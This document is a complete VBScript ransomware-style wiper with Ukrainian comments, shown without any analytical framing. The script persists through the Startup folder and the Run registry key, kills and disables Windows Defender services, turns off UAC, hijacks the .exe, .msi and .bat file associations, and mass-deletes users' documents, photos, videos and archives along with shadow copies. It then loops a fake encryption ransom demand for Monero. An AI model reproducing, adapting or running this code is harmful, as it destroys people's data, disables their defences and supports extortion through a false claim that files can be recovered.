On Error Resume Next
Dim w,f
Set w=CreateObject("WScript.Shell")
Set f=CreateObject("Scripting.FileSystemObject")

' Автозапуск
s=w.SpecialFolders("Startup")
If Not f.FileExists(s&"\syshelp.vbs")Then f.CopyFile WScript.ScriptFullName,s&"\syshelp.vbs"
w.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysHelp","wscript.exe //B """&WScript.ScriptFullName&"""","REG_SZ"

' Агресивний обхід захисту
w.Run "taskkill /f /im MsMpEng.exe",0,True
w.Run "taskkill /f /im NisSrv.exe",0,True
w.Run "taskkill /f /im SecurityHealthService.exe",0,True
w.Run "net stop WinDefend",0,True
w.Run "sc config WinDefend start= disabled",0,True
w.Run "sc config WdNisSvc start= disabled",0,True
w.Run "sc config Sense start= disabled",0,True

' Вимкнення через реєстр
w.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",1,"REG_DWORD"
w.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiVirus",1,"REG_DWORD"
w.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA",0,"REG_DWORD"

' Блокування системи
w.Run "cmd /c assoc .exe=lockedfile",0,True
w.Run "cmd /c assoc .msi=lockedfile",0,True
w.Run "cmd /c assoc .bat=lockedfile",0,True
w.Run "cmd /c ftype lockedfile=""wscript.exe //B """&WScript.ScriptFullName&""" %1""",0,True

' Знищення даних
w.Run "cmd /c del /f /s /q C:\Users\*.doc C:\Users\*.docx C:\Users\*.pdf C:\Users\*.xls C:\Users\*.xlsx",0,True
w.Run "cmd /c del /f /s /q C:\Users\*.jpg C:\Users\*.png C:\Users\*.mp4 C:\Users\*.zip C:\Users\*.rar",0,True
w.Run "vssadmin delete shadows /all /quiet",0,True

' Головний цикл
Do
w.Popup "████████████████████████████████████"&vbCrLf&_
"█                                        █"&vbCrLf&_
"█    🚨 SYSTEM ENCRYPTION ALERT 🚨      █"&vbCrLf&_
"█                                        █"&vbCrLf&_
"█   All files have been encrypted!       █"&vbCrLf&_
"█   Send $120 Monero to:                 █"&vbCrLf&_
"█   89eQqSuKydd4KS1bZHTm2yD9BArKA4p4vG   █"&vbCrLf&_
"█   Jaoo4CvJJ3Hb3GoocxEWccULvy8WGLRFAa   █"&vbCrLf&_
"█   5NQbuBrnSaXNWtwxU3eNTmjgmcS          █"&vbCrLf&_
"█   Password: monero123a                 █"&vbCrLf&_
"█                                        █"&vbCrLf&_
"████████████████████████████████████",0,"🔐 SYSTEM LOCKED",16

p=InputBox("Enter decryption password:","PASSWORD VERIFICATION")
If p="monero123a" Then
    w.Run "cmd /c assoc .exe=exefile",0,True
    w.Run "cmd /c ftype exefile=""%1"" %*",0,True
    w.Popup "System unlocked!",3,"SUCCESS",64
    WScript.Quit
End If
WScript.Sleep 5000
Loop